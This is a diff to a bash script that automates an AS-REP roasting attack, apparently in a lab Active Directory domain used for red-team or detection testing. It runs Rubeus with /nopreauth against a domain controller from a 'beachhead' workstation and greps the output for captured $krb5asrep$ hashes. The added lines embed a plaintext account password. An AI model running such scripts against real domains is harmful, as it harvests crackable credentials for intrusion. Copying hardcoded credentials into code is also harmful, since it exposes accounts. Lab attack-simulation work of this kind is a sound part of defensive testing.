@@ -1,22 +1,24 @@
 #!/usr/bin/env bash
 # T003 — AS-REP roast from ws01 beachhead (child\analyst_t1) → dc02
-# Operator: provisioning (.60) · Egress: ws01 (.62) · Method 1 (WinRM exec)
 set -euo pipefail
 
 SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
-LIB="${SCRIPT_DIR}/../lib"
+source "${SCRIPT_DIR}/../lib/campaign-a-common.sh"
 CASE_ID="CADRE-T003-ASREP-$(date -u +%Y%m%d)"
 T0=$(date -u +%Y-%m-%dT%H:%M:%SZ)
 
 echo "=== T003 AS-REP | CASE=${CASE_ID} | T0=${T0} ==="
 echo "Path: provisioning → ws01 (analyst_t1 WinRM) → dc02"
 
-echo "--- Gate 0: beachhead ---"
-"${LIB}/ws01-exec.sh" 'whoami; hostname'
-
-echo "--- Attack: Rubeus asktgt /nopreauth on ws01 (LDAP enum blocked for analyst_t1) ---"
-"${LIB}/ws01-exec.sh" 'C:\Tools\cadre-attack\Rubeus.exe asktgt /user:intern_blue /domain:child.cadre.local /dc:dc02.child.cadre.local /nopreauth /nowrap'
+ws01_ensure_rubeus
+OUT="$(campaign_stage_run_ps1 analyst_t1 'T13r_An@lyst!' campaign-a-t003-asrep.ps1)"
+printf '%s\n' "${OUT}"
+if ! printf '%s' "${OUT}" | grep -qE '\$krb5asrep\$|Got TGT|AS-REQ w/o preauth successful'; then
+  echo "T003_FAIL: no AS-REP roast proof in Rubeus output" >&2
+  exit 1
+fi
+echo "T003_OK"
 
 echo "T0=${T0}" | tee "/tmp/${CASE_ID}.t0"
 echo "${CASE_ID}" > /tmp/cadre-last-case-id.txt
-echo "=== T003 run complete — export telemetry with cadre-es-export.sh ==="
+echo "=== T003 run complete ==="
